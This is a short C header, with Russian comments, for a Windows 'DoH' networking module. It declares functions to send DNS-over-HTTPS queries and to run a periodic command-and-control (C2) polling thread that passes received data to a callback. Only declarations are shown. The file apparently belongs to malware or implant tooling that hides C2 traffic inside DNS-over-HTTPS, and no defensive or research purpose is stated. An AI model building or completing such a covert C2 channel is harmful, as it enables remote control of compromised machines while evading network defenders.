#ifndef NET_H
#define NET_H

#include <windows.h>
#include <stdint.h>
#include <stddef.h>

/**
 * DOH модуль
 */
BOOL Net_Init(void);

/**
 * Выполняет GET /dns-query?name=<domain>&type=<qtype>
 * Параметры:
 *  - domain  : доменное имя
 *  - qtype   : числовой код DNS
 *  - buffer  : буфер
 *  - buf_len : [in/out]
 */
BOOL Net_DoHQuery(const char *domain,
                  uint16_t    qtype,
                  uint8_t    *buffer,
                  size_t     *buf_len);

/**
 * Освобождает ресурсы DOH-модуля.
 * Останавливает C2-loop, если он был запущен.
 */
void Net_Shutdown(void);

/**
 * callback при получении данных от C2
 * buffer[0..buf_len-1]
 */
typedef void (*Net_C2Callback)(const uint8_t *buffer, size_t buf_len);

/**
 * C2 поток:
 */
BOOL Net_StartC2Loop(const char    *domain,
                     uint16_t       qtype,
                     DWORD          interval_ms,
                     Net_C2Callback callback);

/**
 * Останавливает запущенный C2 поток
 */
void Net_StopC2Loop(void);

#endif // NET_H
